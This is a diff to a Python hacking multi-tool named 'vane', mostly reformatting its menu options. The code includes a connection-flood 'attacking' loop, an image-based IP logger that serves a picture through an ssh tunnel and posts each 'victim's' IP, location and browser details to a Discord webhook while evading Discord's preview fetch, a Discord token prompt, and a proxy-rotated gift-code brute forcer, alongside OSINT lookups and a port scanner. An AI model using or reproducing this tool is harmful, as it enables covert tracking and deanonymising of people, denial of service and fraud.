@@ -81,6 +81,7 @@ def start():
 
     elif choice == "2":
         from concurrent.futures import ThreadPoolExecutor
+
         user_input = console.input("[cyan]ip/url:  [/cyan]").strip()
 
         parse_target = user_input
@@ -108,7 +109,9 @@ def start():
             port = None
 
         if port is not None:
-            console.print(f"[yellow]testing connection to {host} on port {port}...[/yellow]")
+            console.print(
+                f"[yellow]testing connection to {host} on port {port}...[/yellow]"
+            )
 
             stop_event = threading.Event()
             lock = threading.Lock()
@@ -118,6 +121,7 @@ def start():
 
             def worker():
                 import socket
+
                 nonlocal counter
                 while not stop_event.is_set():
                     try:
@@ -126,7 +130,9 @@ def start():
                             sock.connect((host, port))
 
                             with lock:
-                                console.print(f"{counter}.  attacking {host}:{port}", style="cyan")
+                                console.print(
+                                    f"{counter}.  attacking {host}:{port}", style="cyan"
+                                )
                                 counter += 1
 
                     except TimeoutError:
@@ -135,7 +141,7 @@ def start():
 
                     except ConnectionRefusedError:
                         console.print(f"[red]connection refused on port {port}.[/red]")
-                        stop_event.set() 
+                        stop_event.set()
                         break
 
                     except Exception as e:  # noqa: BLE001
@@ -155,6 +161,7 @@ def start():
                 console.print(r.json(), style="cyan")
             except requests.exceptions.RequestException as e:
                 console.print(f"request failed: {e}", style="cyan")
+
         ip_lookup()
         input("\npress enter to exit...")
 
@@ -200,7 +207,8 @@ def start():
             try:
                 with console.status("sending...", spinner="aesthetic"):
                     r = requests.get(
-                        "https://dns-lookup.com/api/reverse-dns", params={"ip": f"{dns}"}
+                        "https://dns-lookup.com/api/reverse-dns",
+                        params={"ip": f"{dns}"},
                     )
                 console.print(r.json(), style="cyan")
             except requests.exceptions.RequestException as e:
@@ -216,7 +224,8 @@ def start():
             try:
                 with console.status("sending...", spinner="aesthetic"):
                     r = requests.get(
-                        "https://dns-lookup.com/api/email", params={"domain": f"{domain}"}
+                        "https://dns-lookup.com/api/email",
+                        params={"domain": f"{domain}"},
                     )
                 console.print(r.json(), style="cyan")
             except requests.exceptions.RequestException as e:
@@ -237,14 +246,13 @@ def start():
                 console.print(r.json(), style="cyan")
             except requests.exceptions.RequestException as e:
                 console.print(f"request failed: {e}", style="cyan")
+
         sslcerts()
         input("\npress enter to exit...")
 
     elif choice == "9":
         username = console.input("[cyan]username: [/cyan]")
-        url = (
-            "https://raw.githubusercontent.com/WebBreacher/WhatsMyName/main/wmn-data.json"
-        )
+        url = "https://raw.githubusercontent.com/WebBreacher/WhatsMyName/main/wmn-data.json"
 
         from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -259,13 +267,20 @@ def start():
                 def check(site):
                     url = site["uri_check"].replace("{account}", username)
                     try:
-                        r = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
-                        found = site["e_string"] in r.text and r.status_code == site["e_code"]
+                        r = requests.get(
+                            url, timeout=5, headers={"User-Agent": "Mozilla/5.0"}
+                        )
+                        found = (
+                            site["e_string"] in r.text
+                            and r.status_code == site["e_code"]
+                        )
                     except requests.exceptions.RequestException:
                         return None
                     return {"site": site["name"], "url": url} if found else None
 
-                with console.status(f"checking sites... (0/{total})", spinner="aesthetic") as status:  # noqa: SIM117
+                with console.status(  # noqa: SIM117
+                    f"checking sites... (0/{total})", spinner="aesthetic"
+                ) as status:
                     with ThreadPoolExecutor(max_workers=20) as pool:
                         futures = {pool.submit(check, site): site for site in sites}
                         for future in as_completed(futures):
@@ -284,7 +299,7 @@ def start():
 
     elif choice == "10":
         number = console.input("[cyan]phone number: [/cyan]").strip()
-        if number.startswith("+") == False:
+        if not number.startswith("+"):
             number = "+" + number
 
         def checknumber():
@@ -327,10 +342,16 @@ def start():
     elif choice == "11":
         webhook = console.input("[cyan]webhook url: [/cyan]").strip()
 
-        console.print("\nps: dont use a service like catbox.moe for your image. cannot be a gif", style="cyan")
+        console.print(
+            "\nps: dont use a service like catbox.moe for your image. cannot be a gif",
+            style="cyan",
+        )
         image_url = console.input("[cyan]image url: [/cyan]")
 
-        console.print("your subdomain will be what comes before '.localexpose.net' e.g tenor.localexpose.net", style="cyan")
+        console.print(
+            "your subdomain will be what comes before '.localexpose.net' e.g tenor.localexpose.net",
+            style="cyan",
+        )
         subdomain = console.input("[cyan]subdomain: [/cyan]")
 
         headers = {
@@ -340,88 +361,130 @@ def start():
         }
 
         bindata = httpx.get(image_url, headers=headers).content
-        buggedimg = False 
-        buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-
-
+        buggedimg = False
+        buggedbin = base64.b85decode(
+            b"|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000"
+        )
 
         def format():
-            def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
+            def formatHook(
+                ip, city, reg, country, loc, org, postal, useragent, os, browser
+            ):
                 return {
-            "username": "vane ip logger",
-            "content": " ",
-            "embeds": [
-                {
-                "title": "vane strikes again!",
-                "color": 000000,
-                "description": "a victim opened the original image. you can find their info below.",
-                "author": {
-                    "name": "vane"
-                },
-                "fields": [
-                    {
-                    "name": "ip info",
-                    "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
-                    "inline": True
-                    },
-                    {
-                    "name": "advanced info",
-                    "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `look below!`\n```yaml\n{useragent}\n```",
-                    "inline": False
-                    }
-                ]
-                }
-            ],
-            }
-
-            def prev(ip,uag):
-                return {
-                "username": "vane ip logger",
-                "content": "",
-                "embeds": [
-                    {
-                    "title": "vane alert!",
-                    "color": 000000,
-                    "description": f"discord previewed a vane image! You can expect an ip soon.\n\n**IP:** `{ip}`\n**UserAgent:** `look below!`\n```yaml\n{uag}```",
-                    "author": {
-                        "name": "vane"
-                    },
-                    "fields": [
-                    ]
-                    }
-                ],
+                    "username": "vane ip logger",
+                    "content": " ",
+                    "embeds": [
+                        {
+                            "title": "vane strikes again!",
+                            "color": 000000,
+                            "description": "a victim opened the original image. you can find their info below.",
+                            "author": {"name": "vane"},
+                            "fields": [
+                                {
+                                    "name": "ip info",
+                                    "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
+                                    "inline": True,
+                                },
+                                {
+                                    "name": "advanced info",
+                                    "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `look below!`\n```yaml\n{useragent}\n```",
+                                    "inline": False,
+                                },
+                            ],
+                        }
+                    ],
                 }
 
+            def prev(ip, uag):
+                return {
+                    "username": "vane ip logger",
+                    "content": "",
+                    "embeds": [
+                        {
+                            "title": "vane alert!",
+                            "color": 000000,
+                            "description": f"discord previewed a vane image! You can expect an ip soon.\n\n**IP:** `{ip}`\n**UserAgent:** `look below!`\n```yaml\n{uag}```",
+                            "author": {"name": "vane"},
+                            "fields": [],
+                        }
+                    ],
+                }
 
-            
             class handler(BaseHTTPRequestHandler):
-                        def do_GET(self):
-                            s = self.path
-                            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                            try: data = httpx.get(dic['url']).content if 'url' in dic else bindata
-                            except Exception: data = bindata  # noqa: BLE001
-                            useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'no user agent found!'
-                            os, browser = httpagentparser.simple_detect(useragent)
-                            if self.headers.get('x-forwarded-for', '').startswith(('35','34','104.196')):
-                                if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); httpx.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
-                                else: pass
-                            else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); httpx.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
-                            return  # noqa: PLR1711
+                def do_GET(self):
+                    s = self.path
+                    dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                    try:
+                        data = (
+                            httpx.get(dic["url"]).content if "url" in dic else bindata
+                        )
+                    except Exception:  # noqa: BLE001
+                        data = bindata
+                    useragent = (
+                        self.headers.get("user-agent")
+                        if "user-agent" in self.headers
+                        else "no user agent found!"
+                    )
+                    os, browser = httpagentparser.simple_detect(useragent)
+                    if self.headers.get("x-forwarded-for", "").startswith(
+                        ("35", "34", "104.196")
+                    ):
+                        if "discord" in useragent.lower():
+                            self.send_response(200)
+                            self.send_header("Content-type", "image/jpeg")
+                            self.end_headers()
+                            self.wfile.write(buggedbin if buggedimg else bindata)
+                            httpx.post(
+                                webhook,
+                                json=prev(
+                                    self.headers.get("x-forwarded-for"), useragent
+                                ),
+                            )
+                        else:
+                            pass
+                    else:
+                        self.send_response(200)
+                        self.send_header("Content-type", "image/jpeg")
+                        self.end_headers()
+                        self.wfile.write(data)
+                        ipInfo = httpx.get(
+                            "https://ipinfo.io/{}/json".format(
+                                self.headers.get("x-forwarded-for")
+                            )
+                        ).json()
+                        httpx.post(
+                            webhook,
+                            json=formatHook(
+                                ipInfo["ip"],
+                                ipInfo["city"],
+                                ipInfo["region"],
+                                ipInfo["country"],
+                                ipInfo["loc"],
+                                ipInfo["org"],
+                                ipInfo["postal"],
+                                useragent,
+                                os,
+                                browser,
+                            ),
+                        )
+                    return  # noqa: PLR1711
 
-            try: 
-                server = HTTPServer(('0.0.0.0', 9000), handler) 
+            try:
+                server = HTTPServer(("0.0.0.0", 9000), handler)
                 console.print("image server running. ctrl + c to stop \n")
-                tunnel = subprocess.Popen(['ssh', '-R', f'{subdomain}:3000:localhost:9000', 'localexpose.net'])
-                server.serve_forever() 
+                tunnel = subprocess.Popen(
+                    ["ssh", "-R", f"{subdomain}:3000:localhost:9000", "localexpose.net"]
+                )
+                server.serve_forever()
             except KeyboardInterrupt:
                 tunnel.terminate()
                 tunnel.kill()
-                os._exit(1)
                 os._exit(1)
 
         format()
 
     elif choice == "12":
+
         def tempemail():
             try:
                 addr = console.input("[cyan]email name: [/cyan]").strip().lower()
@@ -437,7 +500,7 @@ def start():
                     r = requests.get(
                         "https://api.catchmail.io/api/v1/mailbox",
                         params={"address": addr},
-                        timeout=5
+                        timeout=5,
                     )
 
                     r.raise_for_status()
@@ -452,7 +515,7 @@ def start():
                         mail = requests.get(
                             f"https://api.catchmail.io/api/v1/message/{email['id']}",
                             params={"mailbox": addr},
-                            timeout=5
+                            timeout=5,
                         )
 
                         mail.raise_for_status()
@@ -460,15 +523,15 @@ def start():
 
                         console.print(
                             f"""
-from: {email['from']}
-subject: {email['subject']}
-date: {email['date']}
-id: {email['id']}
+from: {email["from"]}
+subject: {email["subject"]}
+date: {email["date"]}
+id: {email["id"]}
 
 text:
-{full['body']['text'] or full['body']['html']}
+{full["body"]["text"] or full["body"]["html"]}
                 """,
-                            style="cyan"
+                            style="cyan",
                         )
 
                     time.sleep(1)
@@ -480,6 +543,7 @@ text:
 
     elif choice == "13":
         path = Path(console.input("[cyan]path to image: [/cyan]").strip().strip("'\""))
+
         def exiftools():
             try:
                 img = Image.open(path)
@@ -504,26 +568,31 @@ text:
                     console.print("not clearing.", style="cyan")
             except Exception as e:  # noqa: BLE001
                 console.print(f"invalid path. {e}", style="cyan")
+
         exiftools()
         input("\npress enter to exit...")
 
-    elif choice =="14":
+    elif choice == "14":
+
         def password_gen():
             try:
                 length = int(input("\nlength (default 20): ") or 20)
             except ValueError:
                 length = 20
 
-            charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
+            charset = (
+                string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
+            )
 
             for i in range(8):
-                pwd = ''.join(secrets.choice(charset) for _ in range(length))
-                print(f"{i+1:02}: {pwd}")
-        
+                pwd = "".join(secrets.choice(charset) for _ in range(length))
+                print(f"{i + 1:02}: {pwd}")
+
         password_gen()
         console.input("\n[cyan]press enter to quit... [/cyan]")
 
-    elif choice =="15":
+    elif choice == "15":
+
         def change_hypesquad_badge(token, badge_id):
             url = "https://discord.com/api/v9/hypesquad/online"
             headers = {
@@ -543,7 +612,6 @@ text:
             except Exception as e:  # noqa: BLE001
                 console.print(f"error: {e}")
 
-
         if __name__ == "__main__":
             token = console.input("discord account token: ")
             badge_id = console.input(
@@ -558,8 +626,10 @@ text:
                 console.input("\n[cyan]press enter to quit... [/cyan]")
 
     elif choice == "16":
+
         def showhwid():
             console.print(f"hwid: {hwid.get_hwid()}")
+
         showhwid()
         console.input("\n[cyan]press enter to quit... [/cyan]")
 
@@ -578,9 +648,9 @@ text:
             console.print(f"decoded text:\n{dec_text}", style="cyan")
             console.input("\n[cyan]press enter to quit... [/cyan]")
 
-
     elif choice == "18":
         from urllib.parse import urlparse
+
         url = console.input("[cyan]url: [/cyan]").strip()
 
         if not url.startswith(("http://", "https://")):
@@ -598,9 +668,7 @@ text:
                     url,
                     follow_redirects=True,
                     timeout=10,
-                    headers={
-                        "User-Agent": "vane/1.0"
-                    }
+                    headers={"User-Agent": "vane/1.0"},
                 )
 
             console.print("\n[bold cyan]url inspector[/bold cyan]\n")
@@ -627,17 +695,13 @@ text:
             content_length = response.headers.get("content-length")
 
             if content_length:
-                console.print(
-                    f"[cyan]size:[/cyan]         {content_length} bytes"
-                )
+                console.print(f"[cyan]size:[/cyan]         {content_length} bytes")
             else:
                 console.print(
                     f"[cyan]size:[/cyan]         {len(response.content)} bytes"
                 )
 
-            console.print(
-                f"[cyan]redirects:[/cyan]    {len(response.history)}"
-            )
+            console.print(f"[cyan]redirects:[/cyan]    {len(response.history)}")
 
             console.print("\n[bold cyan]security headers[/bold cyan]")
 
@@ -645,7 +709,7 @@ text:
                 "strict-transport-security": "HSTS",
                 "content-security-policy": "CSP",
                 "x-frame-options": "X-Frame-Options",
-                "x-content-type-options": "X-Content-Type-Options"
+                "x-content-type-options": "X-Content-Type-Options",
             }
 
             for header, name in security_headers.items():
@@ -661,132 +725,131 @@ text:
         except Exception as e:  # noqa: BLE001
             console.print(f"[red]error: {e}[/red]")
 
-
     elif choice == "19":
-            import socket
-            from concurrent.futures import ThreadPoolExecutor, as_completed
-            from urllib.parse import urlparse
+        import socket
+        from concurrent.futures import ThreadPoolExecutor, as_completed
+        from urllib.parse import urlparse
 
-            from rich.progress import Progress
+        from rich.progress import Progress
 
-            host = console.input("[cyan]host: [/cyan]").strip().split(":")[0]
-            proto = console.input("[cyan]protocol (tcp/udp): [/cyan]").strip().lower()
+        host = console.input("[cyan]host: [/cyan]").strip().split(":")[0]
+        proto = console.input("[cyan]protocol (tcp/udp): [/cyan]").strip().lower()
 
-            if host.startswith(("http://", "https://")):
-                host = urlparse(host).hostname
+        if host.startswith(("http://", "https://")):
+            host = urlparse(host).hostname
 
-            if not host:
-                console.print("[red]invalid host[/red]")
-                console.input("\n[cyan]press enter to quit... [/cyan]")
-            elif proto not in ("tcp", "udp"):
-                console.print("[red]invalid protocol[/red]")
-                console.input("\n[cyan]press enter to quit... [/cyan]")
-            else:
-                start = 1
-                end = 1024
-                max_workers = 50
+        if not host:
+            console.print("[red]invalid host[/red]")
+            console.input("\n[cyan]press enter to quit... [/cyan]")
+        elif proto not in ("tcp", "udp"):
+            console.print("[red]invalid protocol[/red]")
+            console.input("\n[cyan]press enter to quit... [/cyan]")
+        else:
+            start = 1
+            end = 1024
+            max_workers = 50
 
-                console.print(
-                    f"\n[cyan]scanning {host} ({start}-{end}) [{proto}]...[/cyan]\n"
-                )
+            console.print(
+                f"\n[cyan]scanning {host} ({start}-{end}) [{proto}]...[/cyan]\n"
+            )
 
-                def scan_tcp(port):
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(0.5)
+            def scan_tcp(port):
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
 
-                    try:
-                        result = sock.connect_ex((host, port))
+                try:
+                    result = sock.connect_ex((host, port))
 
-                        if result == 0:
-                            try:
-                                service = socket.getservbyport(port, "tcp")
-                            except OSError:
-                                service = "unknown"
-
-                            return port, service, "open"
-
-                    except OSError:
-                        return None
-
-                    finally:
-                        sock.close()
-
-                    return None
-
-                def scan_udp(port):
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    sock.settimeout(0.9)
-
-                    try:
-                        sock.connect((host, port))
-                        sock.send(b"")
-
+                    if result == 0:
                         try:
-                            sock.recv(1024)
-                            state = "open"
-                        except socket.timeout:  # noqa: UP041
-                            state = "open|filtered"
-                        except (ConnectionRefusedError, ConnectionResetError):
-                            return None
-
-                        try:
-                            service = socket.getservbyport(port, "udp")
+                            service = socket.getservbyport(port, "tcp")
                         except OSError:
                             service = "unknown"
 
-                        return port, service, state
+                        return port, service, "open"
 
-                    except OSError:
-                        return None
+                except OSError:
+                    return None
 
-                    finally:
-                        sock.close()
+                finally:
+                    sock.close()
 
-                scan_fn = scan_tcp if proto == "tcp" else scan_udp
-                open_ports = []
+                return None
+
+            def scan_udp(port):
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.settimeout(0.9)
 
                 try:
-                    with Progress() as progress:
-                        task = progress.add_task(
-                            "[cyan]scanning ports...",
-                            total=end - start + 1
-                        )
+                    sock.connect((host, port))
+                    sock.send(b"")
 
-                        with ThreadPoolExecutor(max_workers=max_workers) as executor:
-                            futures = [
-                                executor.submit(scan_fn, port)
-                                for port in range(start, end + 1)
-                            ]
+                    try:
+                        sock.recv(1024)
+                        state = "open"
+                    except socket.timeout:  # noqa: UP041
+                        state = "open|filtered"
+                    except (ConnectionRefusedError, ConnectionResetError):
+                        return None
 
-                            for future in as_completed(futures):
-                                result = future.result()
+                    try:
+                        service = socket.getservbyport(port, "udp")
+                    except OSError:
+                        service = "unknown"
 
-                                if result:
-                                    port, service, state = result
-                                    open_ports.append((port, service, state))
+                    return port, service, state
 
-                                    console.print(
-                                        f"[green][+] {port:<5} {state}[/green] "
-                                        f"[dim]({service})[/dim]"
-                                    )
+                except OSError:
+                    return None
 
-                                progress.advance(task)
+                finally:
+                    sock.close()
 
-                    open_ports.sort()
+            scan_fn = scan_tcp if proto == "tcp" else scan_udp
+            open_ports = []
 
-                    console.print(
-                        f"\n[cyan]scanned {end - start + 1} ports | "
-                        f"{len(open_ports)} open[/cyan]"
+            try:
+                with Progress() as progress:
+                    task = progress.add_task(
+                        "[cyan]scanning ports...", total=end - start + 1
                     )
 
-                except OSError as e:
-                    console.print(f"[red]scanner error: {e}[/red]")
+                    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                        futures = [
+                            executor.submit(scan_fn, port)
+                            for port in range(start, end + 1)
+                        ]
 
-                console.input("\n[cyan]press enter to quit... [/cyan]")
+                        for future in as_completed(futures):
+                            result = future.result()
+
+                            if result:
+                                port, service, state = result
+                                open_ports.append((port, service, state))
+
+                                console.print(
+                                    f"[green][+] {port:<5} {state}[/green] "
+                                    f"[dim]({service})[/dim]"
+                                )
+
+                            progress.advance(task)
+
+                open_ports.sort()
+
+                console.print(
+                    f"\n[cyan]scanned {end - start + 1} ports | "
+                    f"{len(open_ports)} open[/cyan]"
+                )
+
+            except OSError as e:
+                console.print(f"[red]scanner error: {e}[/red]")
+
+            console.input("\n[cyan]press enter to quit... [/cyan]")
 
     elif choice == "20":
         proxy_choice = console.input("[cyan]use proxys (y / n)[/cyan]")
         from concurrent.futures import ThreadPoolExecutor
+
         if proxy_choice == "y":
             url = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&protocol=http&anonymity=elite%2Canonymous%2Ctransparent&timeout=90"
             r = requests.get(url, timeout=15)
@@ -795,9 +858,11 @@ text:
             def check(p):
                 console.print("checking working proxys...", style="blue")
                 try:
-                    r = requests.get("https://api.ipify.org",
-                                    proxies={"http": f"http://{p}", "https": f"http://{p}"},
-                                    timeout=1)
+                    r = requests.get(
+                        "https://api.ipify.org",
+                        proxies={"http": f"http://{p}", "https": f"http://{p}"},
+                        timeout=1,
+                    )
                     return p if r.status_code == 200 else None
                 except Exception:  # noqa: BLE001
                     return None
@@ -817,25 +882,34 @@ text:
         chars = string.ascii_letters + string.digits
         lent = 16
         num_threads = 8
-        
+
         stop_event = threading.Event()
         print_lock = threading.Lock()
-        
-        
+
         def worker():
             while not stop_event.is_set():
-                combo = ''.join(random.choices(chars, k=lent))
+                combo = "".join(random.choices(chars, k=lent))
                 url = baseurl + combo
                 try:
                     if proxy_choice == "y":
-                        resp = requests.get(url, timeout=5, params={
-                        "with_application": "true", 
-                        "with_subscription_plan": "false",}, proxies=random_proxy())
+                        resp = requests.get(
+                            url,
+                            timeout=5,
+                            params={
+                                "with_application": "true",
+                                "with_subscription_plan": "false",
+                            },
+                            proxies=random_proxy(),
+                        )
                     else:
-                        resp = requests.get(url, timeout=5, params={
-                        "with_application": "true", 
-                        "with_subscription_plan": "false",})
-
+                        resp = requests.get(
+                            url,
+                            timeout=5,
+                            params={
+                                "with_application": "true",
+                                "with_subscription_plan": "false",
+                            },
+                        )
 
                     if resp.status_code == 404:
                         status = "[red]unavailable[/red]"
@@ -848,27 +922,28 @@ text:
                         console.print("saved!", style="green")
                 except requests.RequestException as e:
                     status = f"error: {e}"
-        
+
                 with print_lock:
                     console.print(f"{url} -> {status}")
-        
-        
+
         def main():
-            threads = [threading.Thread(target=worker, daemon=True) for _ in range(num_threads)]
+            threads = [
+                threading.Thread(target=worker, daemon=True) for _ in range(num_threads)
+            ]
             for t in threads:
                 t.start()
-        
+
             try:
                 while True:
                     time.sleep(1)
             except KeyboardInterrupt:
                 stop_event.set()
                 print("stopped")
+
         main()
-
-
 
     else:
         print("quitting")
+
 
 start()
